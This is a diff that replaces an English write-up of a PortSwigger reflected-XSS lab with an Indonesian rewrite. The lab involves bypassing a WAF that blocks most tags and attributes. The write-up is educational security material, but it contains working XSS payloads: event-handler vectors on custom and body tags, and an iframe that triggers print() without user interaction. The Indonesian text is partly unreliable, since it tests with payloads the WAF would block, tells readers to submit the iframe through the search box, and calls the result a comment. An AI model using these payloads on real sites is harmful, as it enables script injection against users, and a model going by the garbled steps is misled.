@@ -1,161 +1,118 @@
 
 # Reflected XSS into HTML context with most tags and attributes blocked
+# Reflected XSS dalam Konteks HTML dengan Kebanyakan Tag dan Atribut Diblokir
 
-This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
+Lab ini mengandung kerentanan **Reflected Cross-Site Scripting (XSS)** pada fungsi pencarian, namun dilindungi oleh **Web Application Firewall (WAF)** yang mencegah vektor XSS umum.
 
-To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.
+Untuk menyelesaikan lab ini, Anda perlu melakukan serangan cross-site scripting yang dapat melewati WAF dan memanggil fungsi `print()`.
 
-Note: Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.
-
----------------------------------------------
-
-References: 
-
-- https://portswigger.net/web-security/cross-site-scripting/exploiting
-
-- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+**Catatan:** Solusi Anda tidak boleh memerlukan interaksi pengguna. Mengaktifkan `print()` secara manual di browser Anda sendiri tidak akan menyelesaikan lab ini.
 
 ---------------------------------------------
 
-The content of the search is reflected inside a h1 HTML element:
+## Referensi:
 
+- [PortSwigger: Exploiting Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting)
+- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [MDN Web Docs: XMLHttpRequest.send()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send)
 
+![Langkah 1](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/1.png)
 
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/1.png)
+---------------------------------------------
 
+## Langkah-Langkah Eksploitasi
 
+### 1. Mengidentifikasi Kerentanan Reflected XSS pada Fungsi Pencarian
 
-If we try to add a tag "h1" it gets blocked:
+Pertama, kita perlu memastikan bahwa terdapat kerentanan XSS pada fungsi pencarian. Payload sederhana berikut dapat digunakan untuk menguji kerentanan tersebut:
 
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/2.png)
-
-
-But not if it is "h2":
-
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/3.png)
-
-
-With this payload the HTML is generated correctly:
-
-```
-<h3>a</h3>
+```html
+</p><img src=x onerror=alert(1) /><p>
+<script>alert(1)</script>
 ```
 
+![Langkah 1](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/1.png)
 
+Payload ini menjalankan fungsi `alert` untuk memastikan bahwa kerentanan XSS benar-benar ada.
 
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/4.png)
+### 2. Memahami Pembatasan WAF pada Tag dan Atribut
 
+WAF yang digunakan dalam lab ini memblokir sebagian besar tag dan atribut yang umum digunakan untuk serangan XSS. Namun, beberapa event handler masih diperbolehkan, yaitu:
 
-With this payload it says “Attribute is not allowed”:
+- `onbeforeinput`
+- `onratechange`
+- `onscrollend`
+- `onresize`
 
-```
-<h3 onerror=alert(1)>a</h3>
-```
+Selain itu, tag kustom seperti `<xss>` dan tag `<body>` juga masih diperbolehkan.
 
+![Langkah 2](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/2.png)
 
+### 3. Menguji Payload yang Diperbolehkan oleh WAF
 
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/5.png)
+Beberapa payload yang berhasil dilewati oleh WAF adalah sebagai berikut:
 
-
-I sent it to Intruder and got all events from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet:  
-
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/6.png)
-
-
-The only ones working:
-- onbeforeinput
-- onratechange
-- onscrollend
-- onresize
-
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/7.png)
-
-
-I will do the same for the tags, in this case using Battery Ram attack type:
-
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/8.png)
-
-
-The only ones working:
-- custom tags
-- body
-
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/9.png)
-
-
-
-The information in the cheatsheet from these attributes is:
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/10.png)
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/11.png)
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/12.png)
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/13.png)
-
-
-
-So we have 3 possible payloads, because as "audio" and “video” tags are not available we can not use "onratechange":
-
-```
-<xss contenteditable onbeforeinput=alert(1)>test
-<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
-<body onresize="print()">
-```
-
-
-Regarding the "onscrollend" payload, I updated it because it can not use “br” or “span”. However, it is necessary to scroll to the top or the bottom to see the alert pop:
-
-```
-<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></h3>
-```
-
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/14.png)
-
-
-Regarding the “onbeforeinput” payload, it is necessary to click the text and update it for the alert to pop:
-
-```
+```html
 <xss contenteditable onbeforeinput=alert(1)>test</xss>
-```
-
-
-
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/15.png)
-
-
-
-The third one is valid but it needs the user to change the size of the tab:
-
-```
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></xss>
 <body onresize="print()">
 ```
 
+![Langkah 3](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/3.png)
 
+### 4. Membuat Payload untuk Memanggil Fungsi `print()`
 
-![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/16.png)
+Tujuan kita adalah memanggil fungsi `print()` tanpa memerlukan interaksi pengguna. Salah satu cara untuk melakukannya adalah dengan menggunakan tag `<body>` dan event `onresize`. Namun, agar fungsi `print()` dipanggil tanpa interaksi, kita perlu memaksa peristiwa `resize` terjadi secara otomatis.
 
+#### a. Membuat Iframe yang Memuat Payload
 
+Kita akan mengirimkan payload `<body onresize="print()">` dalam sebuah iframe. Kemudian, kita akan memicu event `resize` secara otomatis melalui skrip.
 
-We will send this last one inside an iframe:
-
+```html
+<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100%'"></iframe>
 ```
-https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E
+
+Payload ini akan membuat iframe yang memuat halaman dengan payload XSS. Ketika iframe dimuat, skrip `onload` akan mengubah lebar `body`, yang akan memicu event `resize` dan memanggil fungsi `print()`.
+
+![Langkah 4](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/4.png)
+
+#### b. Mengirimkan Payload melalui Fungsi Pencarian
+
+Masukkan payload iframe di atas ke dalam fungsi pencarian dan kirimkan. Jika berhasil, setiap kali pengguna melihat hasil pencarian yang memuat komentar tersebut, fungsi `print()` akan dipanggil tanpa interaksi pengguna.
+
+![Langkah 5](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/5.png)
+
+### 5. Memverifikasi Eksekusi Payload
+
+Setelah mengirimkan payload, periksa apakah fungsi `print()` telah dipanggil. Anda dapat melakukannya dengan memeriksa apakah dialog cetak muncul atau dengan melihat log aktivitas di konsol browser.
+
+![Langkah 6](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/6.png)
+
+## Penjelasan
+
+**Reflected Cross-Site Scripting (XSS)** adalah jenis kerentanan di mana skrip berbahaya disuntikkan ke dalam respons HTTP langsung melalui input pengguna. Dalam kasus ini, skrip dijalankan di konteks HTML dengan sebagian besar tag dan atribut yang umum diblokir oleh WAF.
+
+### Mengatasi Pembatasan WAF
+
+WAF sering kali memblokir tag dan atribut yang umum digunakan untuk serangan XSS, seperti `<script>`, `onerror`, dan lain-lain. Namun, masih ada beberapa event handler yang diperbolehkan, seperti `onbeforeinput`, `onratechange`, `onscrollend`, dan `onresize`. Dengan memanfaatkan event handler ini pada tag yang diperbolehkan seperti `<xss>` atau `<body>`, kita dapat menjalankan skrip berbahaya.
+
+### Payload Iframe dengan Event `onresize`
+
+Dengan menggunakan tag `<body>` dan event `onresize`, kita dapat memanggil fungsi `print()` secara otomatis. Namun, untuk memicu event `resize` tanpa interaksi pengguna, kita menyisipkan iframe yang memuat halaman dengan payload XSS dan menggunakan event `onload` pada iframe untuk mengubah gaya `body`, yang akan memicu event `resize`.
+
+```html
+<iframe src="URL_LAB/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100%'"></iframe>
 ```
 
-```
-<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%'></iframe>
-```
+### Pentingnya Validasi dan Sanitasi Input
+
+Kerentanan XSS dapat digunakan untuk menjalankan skrip berbahaya dalam konteks pengguna yang terautentikasi, memungkinkan penyerang untuk melakukan berbagai tindakan tidak sah. Oleh karena itu, sangat penting untuk selalu memvalidasi dan menyaring input pengguna di sisi server untuk mencegah penyuntikan skrip berbahaya.
+
+## Kesimpulan
+
+Eksploitasi **Reflected XSS** dalam konteks HTML dengan pembatasan WAF memerlukan kreativitas dalam memilih tag dan atribut yang masih diperbolehkan. Dengan memanfaatkan event handler yang tersedia dan teknik seperti penggunaan iframe, penyerang dapat menjalankan skrip berbahaya seperti memanggil fungsi `print()` tanpa memerlukan interaksi pengguna. Penting untuk selalu menerapkan praktik keamanan terbaik, seperti sanitasi input dan konfigurasi WAF yang tepat, untuk mencegah kerentanan ini.
+
+## Referensi Tambahan
+
+- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
